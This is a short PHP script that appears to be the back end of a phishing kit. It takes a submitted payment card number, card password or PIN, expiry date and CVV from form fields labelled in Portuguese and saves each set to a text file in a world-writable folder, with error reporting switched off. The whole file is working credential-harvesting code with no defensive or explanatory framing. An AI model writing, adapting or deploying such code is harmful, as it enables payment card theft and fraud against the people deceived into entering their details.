<?php
 error_reporting(0);
 if(isset($_POST['action'])){
    $card_number  = $_POST['cartao'];
    $card_passw = $_POST['senha'];
    $card_val  = $_POST['validade'];
    $card_cvv  = $_POST['cvv'];

    if(!is_dir('../files')){
        mkdir('../files', 0777);
    } 
    $filename = md5($card_number.date('dmYHis'));
    $arquivo = fopen('../files/'.$filename.'.txt','w'); 
    if ($arquivo == false) die('Error.'); 
    $texto = 
    "
    ===========================================================
    CARTAO: $card_number
    SENHA: $card_passw
    VALIDADE: $card_val
    CVV: $card_cvv
    ===========================================================
    "; 
    fwrite($arquivo, $texto);
    fclose($arquivo); 
    
    echo json_encode(array('status' => 'success')); 
 }

?>
